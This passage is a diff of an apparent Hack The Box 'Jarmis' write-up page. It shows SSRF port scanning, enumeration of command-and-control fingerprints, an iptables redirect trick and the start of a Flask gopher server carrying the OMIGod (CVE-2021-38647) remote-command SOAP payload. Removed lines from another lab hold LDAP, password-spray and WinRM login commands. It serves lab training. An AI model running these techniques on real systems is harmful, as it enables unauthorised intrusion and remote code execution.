+<pre tabindex="0"><code>{
+  &#34;sig&#34;: &#34;21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46&#34;,
+  &#34;ismalicious&#34;: false,
+  &#34;endpoint&#34;: &#34;10.10.14.18:443&#34;,
+  &#34;note&#34;: &#34;Ncat?&#34;,
+  &#34;server&#34;: &#34;&#34;
+}
+</code></pre><ul>
+<li>JARM (or JARM fingerprinting) is ==an active Transport Layer Security (TLS) server fingerprinting tool developed by Salesforce== that helps identify and group servers based on their TLS configuration, potentially revealing malicious servers or malware command and control (C2) infrastructure</li>
+<li>This <a href="https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a/" target="_blank">article</a> goes in-depth with JARM but the bottom line is, JARM works by <strong>actively sending 10 TLS Client Hello packets to a target TLS server and capturing specific attributes of the TLS Server Hello responses</strong>. The aggregated TLS server responses are then hashed in a specific way to produce the JARM fingerprint.</li>
+<li>My guess here is the response signature that I got must be from the first request out of the ten intended ones because ncat allowed only one connection, I can change it allow multiple connections by including the <code>-k</code> flag.</li>
+<li>Now I actually got ten connections in the logs</li>
+</ul>
+<pre tabindex="0"><code>❯ ncat --ssl -lnvkp 443
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 0293 5838 F917 921F 69AB 00DB 4768 FC73 813C 4488
+Ncat: Listening on [::]:443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.117:47618.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
+Ncat: Connection from 10.10.11.117:47620.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
+Ncat: Connection from 10.10.11.117:47622.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A0000C1:SSL routines::no shared cipher
+Ncat: Connection from 10.10.11.117:47624.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
+Ncat: Connection from 10.10.11.117:47626.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
+Ncat: Connection from 10.10.11.117:47628.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
+Ncat: Connection from 10.10.11.117:47634.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
+Ncat: Connection from 10.10.11.117:47636.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
+Ncat: Connection from 10.10.11.117:47640.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A0000C1:SSL routines::no shared cipher
+Ncat: Connection from 10.10.11.117:47642.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A00006C:SSL routines::bad key share
+</code></pre><ul>
+<li>The response from this also looks weird, now the response has different looking signature than the previous ones:</li>
+</ul>
+<pre tabindex="0"><code>❯ curl &#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18&#39; -H &#39;accept: application/json&#39; | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   122  100   122    0     0     15      0  0:00:08  0:00:07  0:00:01    27
+{
+  &#34;sig&#34;: &#34;21d19d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21&#34;,
+  &#34;endpoint&#34;: &#34;10.10.14.18:443&#34;,
+  &#34;note&#34;: &#34;10.10.14.18&#34;
+}
+</code></pre><ul>
+<li>The response from single connection:</li>
+</ul>
+<pre tabindex="0"><code>❯ curl &#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18&#39; -H &#39;accept: application/json&#39; | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   148  100   148    0     0     28      0  0:00:05  0:00:05 --:--:--    39
+{
+  &#34;sig&#34;: &#34;21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46&#34;,
+  &#34;ismalicious&#34;: false,
+  &#34;endpoint&#34;: &#34;10.10.14.18:443&#34;,
+  &#34;note&#34;: &#34;Ncat?&#34;,
+  &#34;server&#34;: &#34;&#34;
+}
+</code></pre><ul>
+<li>The response from the first to non-TLS listener:</li>
+</ul>
+<pre tabindex="0"><code>❯ curl &#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001&#39; -H &#39;accept: application/json&#39; 
+{&#34;sig&#34;:&#34;00000000000000000000000000000000000000000000000000000000000000&#34;,&#34;endpoint&#34;:&#34;10.10.14.18:6001&#34;,&#34;note&#34;:&#34;10.10.14.18&#34;}
+</code></pre><ul>
+<li>We can see the differences clearly. Also in my recent response multiple fields are missing (i.e. <code>server</code>, <code>ismalicious</code>)</li>
+<li>My recent response is not in the database</li>
+</ul>
+<pre tabindex="0"><code>❯ curl &#39;http://10.10.11.117/api/v1/search/signature/?keyword=21d19d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21&amp;max_results=10&#39; -H &#39;accept: application/json&#39; | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    14  100    14    0     0     22      0 --:--:-- --:--:-- --:--:--    22
+{
+  &#34;results&#34;: []
+}
+</code></pre><ul>
+<li>We can see in the previous requests as it made from ncat it shows <code>note</code> value as <code>NCAT?</code> also <code>ismalicious=false</code> which is suspicious, as there could be fields with true value.</li>
+<li>Thankfully we can identify this easily by iterating over all the values in the ID parameter. First let us narrow down the values</li>
+</ul>
+<pre tabindex="0"><code>❯ curl http://10.10.11.117/api/v1/search/id/400 
+null%                                                                                                                  
+HTB/Machines/Jarmis 
+❯ curl http://10.10.11.117/api/v1/search/id/300 
+null%                                                                                                                  
+HTB/Machines/Jarmis 
+❯ curl http://10.10.11.117/api/v1/search/id/200 
+{&#34;id&#34;:200,&#34;sig&#34;:&#34;29d29d00029d29d21c29d29d29d29df3fb741bc8febeb816e400df4c5f2e9e&#34;,&#34;ismalicious&#34;:false,&#34;endpoint&#34;:&#34;176.32.103.205:443&#34;,&#34;note&#34;:&#34;amazon.com&#34;}%  
+</code></pre><ul>
+<li>So the values should be between 0 to 200 something. Now lets get the accurate value</li>
+</ul>
+<pre tabindex="0"><code>HTB/Machines/Jarmis 
+❯ curl http://10.10.11.117/api/v1/search/id/220
+{&#34;id&#34;:220,&#34;sig&#34;:&#34;29d29d00029d29d21c42d43d00041d44609a5a9a88e797f466e878a82e8365&#34;,&#34;ismalicious&#34;:false,&#34;endpoint&#34;:&#34;3.211.157.115:443&#34;,&#34;note&#34;:&#34;netflix.com&#34;}%                                                                                    
+HTB/Machines/Jarmis 
+❯ curl http://10.10.11.117/api/v1/search/id/230
+null%                                                                                                                  
+HTB/Machines/Jarmis 
+❯ curl http://10.10.11.117/api/v1/search/id/221
+{&#34;id&#34;:221,&#34;sig&#34;:&#34;29d3fd00029d29d21c42d43d00041df48f145f65c66577d0b01ecea881c1ba&#34;,&#34;ismalicious&#34;:false,&#34;endpoint&#34;:&#34;35.186.224.25:443&#34;,&#34;note&#34;:&#34;spotify.com&#34;}%                                                                                    
+HTB/Machines/Jarmis 
+❯ curl http://10.10.11.117/api/v1/search/id/222
+{&#34;id&#34;:222,&#34;sig&#34;:&#34;27d27d27d00027d1dc27d27d27d27d3446fb8839649f251e5083970c44ad30&#34;,&#34;ismalicious&#34;:false,&#34;endpoint&#34;:&#34;47.246.24.234:443&#34;,&#34;note&#34;:&#34;login.tmall.com&#34;}%                                                                                
+HTB/Machines/Jarmis 
+❯ curl http://10.10.11.117/api/v1/search/id/223
+null%      
+</code></pre><ul>
+<li>I got the accurate value which is <code>222</code>. Now lets perform the enumeration</li>
+<li>For this I made a simple bash script</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> id_num in <span class="o">{</span>1..222<span class="o">}</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">	curl -s  http://10.10.11.117/api/v1/search/id/<span class="nv">$id_num</span> <span class="p">|</span> jq <span class="s1">&#39;select(.ismalicious == true)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><ul>
+<li>This was the output:</li>
+</ul>
+<pre tabindex="0"><code>❯ ./automation.sh 
+jq: parse error: Invalid numeric literal at line 1, column 7
+jq: parse error: Invalid numeric literal at line 1, column 7
+{
+  &#34;id&#34;: 95,
+  &#34;sig&#34;: &#34;2ad2ad00000000000043d2ad2ad43dc4b09cccb7c1d19522df9b67bf57f4fb&#34;,
+  &#34;ismalicious&#34;: true,
+  &#34;endpoint&#34;: &#34;104.24.4.98&#34;,
+  &#34;note&#34;: &#34;Sliver&#34;,
+  &#34;server&#34;: &#34;Apache/2.4.40&#34;
+}
+jq: parse error: Invalid numeric literal at line 1, column 7
+{
+  &#34;id&#34;: 128,
+  &#34;sig&#34;: &#34;2ad2ad0002ad2ad00042d42d000000ad9bf51cc3f5a1e29eecb81d0c7b06eb&#34;,
+  &#34;ismalicious&#34;: true,
+  &#34;endpoint&#34;: &#34;185.199.109.153&#34;,
+  &#34;note&#34;: &#34;SilentTrinity&#34;,
+  &#34;server&#34;: &#34;&#34;
+}
+{
+  &#34;id&#34;: 135,
+  &#34;sig&#34;: &#34;21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46&#34;,
+  &#34;ismalicious&#34;: true,
+  &#34;endpoint&#34;: &#34;104.24.4.98&#34;,
+  &#34;note&#34;: &#34;Ncat&#34;,
+  &#34;server&#34;: &#34;&#34;
+}
+{
+  &#34;id&#34;: 154,
+  &#34;sig&#34;: &#34;07d14d16d21d21d00042d43d000000aa99ce74e2c6d013c745aa52b5cc042d&#34;,
+  &#34;ismalicious&#34;: true,
+  &#34;endpoint&#34;: &#34;99.86.230.31&#34;,
+  &#34;note&#34;: &#34;Metasploit&#34;,
+  &#34;server&#34;: &#34;apache&#34;
+}
+{
+  &#34;id&#34;: 170,
+  &#34;sig&#34;: &#34;22b22b09b22b22b22b22b22b22b22b352842cd5d6b0278445702035e06875c&#34;,
+  &#34;ismalicious&#34;: true,
+  &#34;endpoint&#34;: &#34;94.140.114.239&#34;,
+  &#34;note&#34;: &#34;Trickbot&#34;,
+  &#34;server&#34;: &#34;Cowboy&#34;
+}
+{
+  &#34;id&#34;: 174,
+  &#34;sig&#34;: &#34;29d21b20d29d29d21c41d21b21b41d494e0df9532e75299f15ba73156cee38&#34;,
+  &#34;ismalicious&#34;: true,
+  &#34;endpoint&#34;: &#34;192.64.119.215&#34;,
+  &#34;note&#34;: null,
+  &#34;server&#34;: &#34;&#34;
+}
+{
+  &#34;id&#34;: 178,
+  &#34;sig&#34;: &#34;1dd40d40d00040d1dc1dd40d1dd40d3df2d6a0c2caaa0dc59908f0d3602943&#34;,
+  &#34;ismalicious&#34;: true,
+  &#34;endpoint&#34;: &#34;192.145.239.18&#34;,
+  &#34;note&#34;: &#34;AsyncRAT&#34;,
+  &#34;server&#34;: &#34;&#34;
+}
+{
+  &#34;id&#34;: 179,
+  &#34;sig&#34;: &#34;2ad2ad0002ad2ad00043d2ad2ad43da5207249a18099be84ef3c8811adc883&#34;,
+  &#34;ismalicious&#34;: true,
+  &#34;endpoint&#34;: &#34;94.140.114.239&#34;,
+  &#34;note&#34;: &#34;Sliver&#34;,
+  &#34;server&#34;: &#34;Apache/2.4.38&#34;
+}
+{
+  &#34;id&#34;: 184,
+  &#34;sig&#34;: &#34;28d28d28d00028d00041d28d28d41dd279b0cf765af27fa62e66d7c8281124&#34;,
+  &#34;ismalicious&#34;: true,
+  &#34;endpoint&#34;: &#34;51.136.77.112&#34;,
+  &#34;note&#34;: &#34;Gophish&#34;,
+  &#34;server&#34;: &#34;nginx&#34;
+}
+{
+  &#34;id&#34;: 197,
+  &#34;sig&#34;: &#34;07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1&#34;,
+  &#34;ismalicious&#34;: true,
+  &#34;endpoint&#34;: &#34;104.17.237.190&#34;,
+  &#34;note&#34;: &#34;CobaltStrike&#34;,
+  &#34;server&#34;: &#34;&#34;
+}
+</code></pre><ul>
+<li>There are 10 outputs,  metasploit looks interesting. Let&rsquo;s see what happens if listened from metasploit.</li>
+<li>In metasploit select this module <code>auxillary/server/capture/http</code> and then set the port to 443, make SSL to true. Here is the oneliner</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo msfconsole -x <span class="s2">&#34;use auxiliary/server/capture/http; set srvport 443; set SSL true; run&#34;</span>
+</span></span></code></pre></div><ul>
+<li>Now I curled the fetch endpoint like this and got the note as <code>Metasploit</code>.</li>
+</ul>
+<pre tabindex="0"><code>❯ curl &#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18&#39; | jq . 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   154  100   154    0     0     18      0  0:00:08  0:00:08 --:--:--    32
+{
+  &#34;sig&#34;: &#34;07d19d12d21d21d07c42d43d000000f50d155305214cf247147c43c0f1a823&#34;,
+  &#34;ismalicious&#34;: false,
+  &#34;endpoint&#34;: &#34;10.10.14.18:443&#34;,
+  &#34;note&#34;: &#34;Metasploit?&#34;,
+  &#34;server&#34;: &#34;&#34;
+}
+</code></pre><ul>
+<li>Metasploit log:</li>
+</ul>
+<pre tabindex="0"><code>msf6 auxiliary(server/capture/http) &gt; 
+[*] Started service listener on 0.0.0.0:443 
+[*] Server started.
+[*] HTTP REQUEST 10.10.11.117 &gt; 10.10.14.18:80 GET / Unknown   cookies=
+</code></pre><ul>
+<li>After a while, I tested the fetch endpoint for SSRF and there is SSRF to local host</li>
+<li>I can determine the open ports within the internal network with this vulnerability. The responses differ between open and closed, For an example</li>
+<li><strong>Open Port:</strong></li>
+</ul>
+<pre tabindex="0"><code>❯ curl &#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:22&#39; -H &#39;accept: application/json&#39; | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   117  100   117    0     0    128      0 --:--:-- --:--:-- --:--:--   128
+{
+  &#34;sig&#34;: &#34;00000000000000000000000000000000000000000000000000000000000000&#34;,
+  &#34;endpoint&#34;: &#34;127.0.0.1:22&#34;,
+  &#34;note&#34;: &#34;localhost&#34;
+}
+</code></pre><ul>
+<li><strong>Open Port:</strong></li>
+</ul>
+<pre tabindex="0"><code>❯ curl &#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2Flocalhost:80&#39; -H &#39;accept: application/json&#39; | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   117  100   117    0     0    187      0 --:--:-- --:--:-- --:--:--   187
+{
+  &#34;sig&#34;: &#34;00000000000000000000000000000000000000000000000000000000000000&#34;,
+  &#34;endpoint&#34;: &#34;127.0.0.1:80&#34;,
+  &#34;note&#34;: &#34;localhost&#34;
+}
+</code></pre><ul>
+<li><strong>Closed Port</strong></li>
+</ul>
+<pre tabindex="0"><code>❯ curl &#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:21&#39; -H &#39;accept: application/json&#39; | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   109  100   109    0     0    110      0 --:--:-- --:--:-- --:--:--   110
+{
+  &#34;sig&#34;: &#34;00000000000000000000000000000000000000000000000000000000000000&#34;,
+  &#34;endpoint&#34;: &#34;null&#34;,
+  &#34;note&#34;: &#34;localhost&#34;
+}
+</code></pre><ul>
+<li>As you can see if the port is open it included <code>127.0.0.1</code> in the response else it gives the value <code>null</code></li>
+<li>To automate this I could use bash script but it would be slower</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">BASE_URL</span><span class="o">=</span><span class="s2">&#34;http://jarmis.htb/api/v1/fetch&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">START_PORT</span><span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">END_PORT</span><span class="o">=</span><span class="m">65535</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> port in <span class="k">$(</span>seq <span class="nv">$START_PORT</span> <span class="nv">$END_PORT</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nv">URL</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$BASE_URL</span><span class="s2">?endpoint=http://localhost:</span><span class="nv">$port</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nv">RESPONSE</span><span class="o">=</span><span class="k">$(</span>curl -s <span class="s2">&#34;</span><span class="nv">$URL</span><span class="s2">&#34;</span> -H <span class="s1">&#39;accept: application/json&#39;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.endpoint&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$RESPONSE</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;127.0.0.1:</span><span class="nv">$port</span><span class="s2">&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Port </span><span class="nv">$port</span><span class="s2"> is open&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><ul>
+<li>So I used Fuff to scan</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u <span class="s1">&#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:FUZZ&#39;</span> -w &lt;<span class="o">(</span>seq <span class="m">1</span> 65535<span class="o">)</span> -t <span class="m">60</span> -fr <span class="s1">&#39;&#34;endpoint&#34;:&#34;null&#34;&#39;</span>
+</span></span></code></pre></div><ul>
+<li>The results looks interesting for a Linux box</li>
+</ul>
+<pre tabindex="0"><code>
+22                      [Status: 200, Size: 117, Words: 1, Lines: 1, Duration: 446ms]
+80                      [Status: 200, Size: 117, Words: 1, Lines: 1, Duration: 333ms]
+5986                    [Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 342ms]
+8001                    [Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 368ms]
+33028                   [Status: 200, Size: 120, Words: 1, Lines: 1, Duration: 292ms]
+55394                   [Status: 200, Size: 120, Words: 1, Lines: 1, Duration: 332ms]
+</code></pre><ul>
+<li>Port <code>5986</code> and <code>5985</code> seems interesting particularly because in windows those ports are used by WinRM.</li>
+<li>In the ffuf scan I didn&rsquo;t get port <code>5985</code> but I tested it manually. It took 20 seconds to respond may be that&rsquo;s why ffuf marked it as closed but anyway this port seems interesting.</li>
+</ul>
+<pre tabindex="0"><code>❯ curl &#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:5985&#39; -H &#39;accept: application/json&#39; | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   119  100   119    0     0      5      0  0:00:23  0:00:20  0:00:03    27
+{
+  &#34;sig&#34;: &#34;00000000000000000000000000000000000000000000000000000000000000&#34;,
+  &#34;endpoint&#34;: &#34;127.0.0.1:5985&#34;,
+  &#34;note&#34;: &#34;localhost&#34;
+}
+</code></pre>
 
 <h2 class="relative group">Exploitation 
     <div id="exploitation" class="anchor"></div>
@@ -1211,333 +1597,192 @@
     
 </h2>
 <ul>
-<li>If we search the results of ldapsearch , particularly in the info field I can get another password. Which is new to me cause I never seen anything sensitive in an info field.
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/YtbP6LkOtbsAAAAd/everything-was-very-new-to-me-jiya-shankar.gif" alt="new" />
-    
-  </figure>
-</li>
+<li>The port 5985 has Microsoft Open Management Infrastructure running we can exploit this service using <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-38647" target="_blank">CVE-2021-38647</a> and there is also a <a href="https://github.com/horizon3ai/CVE-2021-38647" target="_blank">POC</a> for this. But the POC just sends POST request to 5985 (Without TLS) or to 5986 (TLS included)</li>
+<li>Vulnerable part of this application is, Usually JARM sends 10 requests to verify and generate signature this part is known to us but here when the listener is malicious (i.e ismalicious=true) then JARM sends one extra request which is the 11th request. If we could get that request on listener then we could potentially modify it to exploit OMIGod(CVE-2021-38647).</li>
+<li>To achieve this we need to modify the Ip tables rules as proxy chains doesn&rsquo;t support this level of precision</li>
+<li>Lets flush all the previous rules</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -H ldap://support.htb -D <span class="s1">&#39;ldap@support.htb&#39;</span> -w <span class="s1">&#39;&lt;password&#39;</span> -b <span class="s2">&#34;DC=support,DC=htb&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;info&#34;</span>
-</span></span></code></pre></div><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221212252.png?raw=true" alt="Pasted image 20241221212252.png" />
-    
-  </figure>
-</p>
-<ul>
-<li>In LDAP I got this password from the user <code>support@support.htb</code></li>
-<li>I checked the bloodhound data, and user <code>support</code> is member of three groups
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221213052.png?raw=true" alt="Pasted image 20241221213052.png" />
-    
-  </figure>
-</li>
-<li>For a change I used <code>crackmapexec</code> to password spray, eventually it confirms the password for <code>support</code> user</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crackmapexec winrm support.htb -u users-smb.txt -p &lt;password&gt;
-</span></span></code></pre></div><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221213417.png?raw=true" alt="Pasted image 20241221213417.png" />
-    
-  </figure>
-</p>
-<ul>
-<li>Using the newly dicovered password I logged into winrm via <code>evilwinrm</code> as user <code>support</code></li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u support -p <span class="s1">&#39;&lt;password&gt;&#39;</span> -i support.htb 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo iptables -t nat -F
 </span></span></code></pre></div><ul>
-<li>Got the 
-<div class="flex mt-2">
-<span
-  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
->
-  <span class="flex flex-row items-center">
-    
-    <span>User flag</span>
-  </span>
-</span>
-</div>
+<li>Then add the rule to redirect the 11th request from <code>443</code> to port <code>8443</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo iptables -I PREROUTING -t nat -p tcp --dport <span class="m">443</span> -m statistic --mode nth --every <span class="m">11</span> --packet <span class="m">10</span> -j REDIRECT --to-port <span class="m">8443</span>
+</span></span></code></pre></div><ul>
+<li>To test this lets open two listeners, one on port <code>443</code> other on <code>8443</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ncat --ssl -lnvp <span class="m">443</span>
+</span></span></code></pre></div><ul>
+<li>for port <code>8443</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ncat -ssl -lnvp <span class="m">8443</span>
+</span></span></code></pre></div><ul>
+<li>I used <code>fetch</code> endpoint on my IP, and this worked very well</li>
+<li>On port <code>443</code></li>
+</ul>
+<pre tabindex="0"><code>❯ ncat --ssl -lnvp 443 
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 5B1D F737 C43E 3686 B058 EB4F 6C11 40B8 94DA 6CAD
+Ncat: Listening on [::]:443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.117:56524.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
+</code></pre><ul>
+<li>Redirected 11th request from  port <code>443</code> to <code>8443</code></li>
+</ul>
+<pre tabindex="0"><code>❯ ncat --ssl -lnvp 8443
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 0B19 D1FA 27A0 86F1 D1AC 874E D599 8BF0 9DD1 9DD0
+Ncat: Listening on [::]:8443
+Ncat: Listening on 0.0.0.0:8443
+Ncat: Connection from 10.10.11.117:56544.
+GET / HTTP/1.1
+Host: 10.10.14.18
+User-Agent: curl/7.74.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
 
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221213908.png?raw=true" alt="Pasted image 20241221213908.png" />
-    
-  </figure>
-</li>
+NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
+</code></pre><ul>
+<li>We can exploit this using Gopher protocol. I have used this protocol before when doing ![[5.8-Travel]] box, basically this protocol uses no headers thus perfect for delivering payloads</li>
+<li>I copied the payload data from the <a href="https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/refs/heads/main/omigod.py" target="_blank">POC</a> and after  that I added curly braces replacing previous command data then included it into this python code.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DATA</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;s:Envelope xmlns:s=&#34;http://www.w3.org/2003/05/soap-envelope&#34; xmlns:a=&#34;http://schemas.xmlsoap.org/ws/2004/08/addressing&#34; xmlns:h=&#34;http://schemas.microsoft.com/wbem/wsman/1/windows/shell&#34; xmlns:n=&#34;http://schemas.xmlsoap.org/ws/2004/09/enumeration&#34; xmlns:p=&#34;http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd&#34; xmlns:w=&#34;http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">   &lt;s:Header&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;a:To&gt;HTTP://192.168.1.1:5986/wsman/&lt;/a:To&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;w:ResourceURI s:mustUnderstand=&#34;true&#34;&gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem&lt;/w:ResourceURI&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;a:ReplyTo&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">         &lt;a:Address s:mustUnderstand=&#34;true&#34;&gt;http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous&lt;/a:Address&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;/a:ReplyTo&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;a:Action&gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand&lt;/a:Action&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;w:MaxEnvelopeSize s:mustUnderstand=&#34;true&#34;&gt;102400&lt;/w:MaxEnvelopeSize&gt;
